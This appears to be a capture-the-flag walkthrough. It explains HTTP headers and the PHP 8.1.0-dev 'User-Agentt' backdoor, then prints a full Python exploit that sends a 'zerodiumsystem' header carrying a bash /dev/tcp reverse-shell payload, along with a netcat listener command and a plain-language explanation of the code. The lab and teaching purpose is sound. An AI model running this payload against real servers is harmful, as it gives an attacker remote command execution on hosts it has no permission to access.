Something seems a little off with the server.

Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds...

After deploying the vulnerable machine attached to this task, please wait a couple of minutes for it to respond.

  
What is the flag?

Look closely at the HTTP headers when you request the first page...

HTTP headers are pieces of information that are sent along with an HTTP request or response. They provide additional context about the message being transmitted, such as the content type, the encoding used, the server's name, and so on.

For example, when a client (such as a web browser) sends an HTTP request to a server, it can include headers that specify the type of content being requested, the encoding used, the language preference, and other details. On the other hand, when a server responds to an HTTP request, it can include headers that specify the content type, the encoding used, the server's name, and other details.

Here are a few examples of common HTTP headers:

-   `Content-Type`: Specifies the MIME type of the request or response body. For example, `Content-Type: text/html` indicates that the body contains HTML content.
-   `Content-Encoding`: Specifies the encoding used for the request or response body. For example, `Content-Encoding: gzip` indicates that the body has been compressed using gzip.
-   `Server`: Specifies the name and version of the server that generated the response.
-   `User-Agent`: Specifies the client software that is making the request.

HTTP headers are an important part of the HTTP protocol and play a crucial role in how the web works. They allow clients and servers to communicate additional information about the request or response, and enable a wide range of functionality on the web.

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.

Usage:
  python3 revshell_php_8.1.0-dev.py <target-ip> <attacker-ip> <attacker-port>
"""

#!/usr/bin/env python3
import os, sys, argparse, requests

request = requests.Session()

def check_target(args):
    response = request.get(args.url)
    for header in response.headers.items():
        if "PHP/8.1.0-dev" in header[1]:
            return True
    return False

def reverse_shell(args):
    payload = 'bash -c \"bash -i >& /dev/tcp/' + args.lhost + '/' + args.lport + ' 0>&1\"'
    injection = request.get(args.url, headers={"User-Agentt": "zerodiumsystem('" + payload + "');"}, allow_redirects = False)

def main(): 
    parser = argparse.ArgumentParser(description="Get a reverse shell from PHP 8.1.0-dev backdoor. Set up a netcat listener in another shell: nc -nlvp <attacker PORT>")
    parser.add_argument("url", metavar='<target URL>', help="Target URL")
    parser.add_argument("lhost", metavar='<attacker IP>', help="Attacker listening IP",)
    parser.add_argument("lport", metavar='<attacker PORT>', help="Attacker listening port")
    args = parser.parse_args()
    if check_target(args):
        reverse_shell(args)
    else:
        print("Host is not available or vulnerable, aborting...")
        exit
    
if __name__ == "__main__":
    main()




This code appears to be a script that attempts to exploit a PHP 8.1.0-dev backdoor to gain a reverse shell on a target server. A reverse shell is a type of connection that allows an attacker to execute commands on the target server by connecting to the server from a remote machine.

The script begins by importing the necessary libraries and defining a few functions. The `check_target` function sends an HTTP request to the target URL and checks the response headers for the string "PHP/8.1.0-dev". If this string is found, the function returns `True`, indicating that the target may be vulnerable to the exploit.

The `reverse_shell` function then constructs a payload that, when executed, will create a reverse shell connection back to the attacker's machine. This payload is injected into the target server by sending an HTTP request with a special "User-Agent" header that contains the payload.

Finally, the `main` function parses command-line arguments and uses the `check_target` function to determine if the target is vulnerable. If it is, the `reverse_shell` function is called to try to gain a reverse shell on the target.

It's worth noting that this script is potentially malicious and should be used with caution. It is provided for informational purposes only.
